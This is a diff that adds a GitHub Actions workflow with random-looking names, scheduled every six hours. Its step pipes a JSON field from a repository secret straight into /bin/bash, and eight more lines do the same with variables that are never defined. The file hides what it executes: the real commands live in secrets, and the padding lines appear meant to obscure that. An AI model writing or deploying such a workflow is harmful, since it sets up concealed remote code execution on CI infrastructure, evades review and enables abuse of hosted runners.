@@ -1,0 +1,25 @@
+name: xiaodafeng3216
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '29 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiaodafeng3216
+        env:
+          gerue3965: ${{ secrets.gerue3965 }}
+        run: |
+          echo $gerue3965 | jq -r .uefw74495 | /bin/bash
+          echo $i6 | jq -r .if26 | /bin/bash
+          echo $w7087 | jq -r .u5 | /bin/bash
+          echo $v743 | jq -r .qav01094 | /bin/bash
+          echo $kmoh2080 | jq -r .y80 | /bin/bash
+          echo $m40222 | jq -r .nms94 | /bin/bash
+          echo $umxtw63502 | jq -r .ht675 | /bin/bash
+          echo $we964 | jq -r .ni88206 | /bin/bash
+          echo $xx06 | jq -r .bac80 | /bin/bash
+
